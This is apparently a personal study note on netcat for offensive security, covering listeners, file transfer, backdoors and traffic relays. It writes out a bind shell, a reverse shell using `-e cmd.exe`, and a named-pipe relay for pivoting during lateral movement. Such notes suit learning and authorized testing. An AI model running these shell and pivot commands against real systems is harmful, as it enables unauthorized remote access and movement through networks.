---
tags:
  - red
MOC: "[[Offensive Security Concepts MOC]]"
---
-- --

Netcat is a great tool for a variety of [[Network MOC|network]] connections. 

# Connecting to Open Ports

Create a listener with `nc -l -p <port>` and a receiver with `nc <ip> <port>` for two-way communication.  
# Data Transfer

A file can be hosted by piping it into the listening netcat command. [[UDP Protocol]] connection can be used by adding the `-u` flag.

A file can be pulled by piping the listener into a file. Like pushing transfer, there is no indication of success and must be canceled. 

# Backdoors

Creating a simple backdoor just runs the connected info directly to the shell. `nc -l -p <port> -e /bin/sh`. Create a reverse connection by `nc <ip> <port> -e cmd.exe`.  
# Relays

Relays are important for lateral movement in an attack. 

Create a named pipe with `mkfifo <pipe_name>`. Create a pivot with `nc -l -p <port> < <pipe_name> | nc <target_ip> <target_port> > <pipe_name>`. 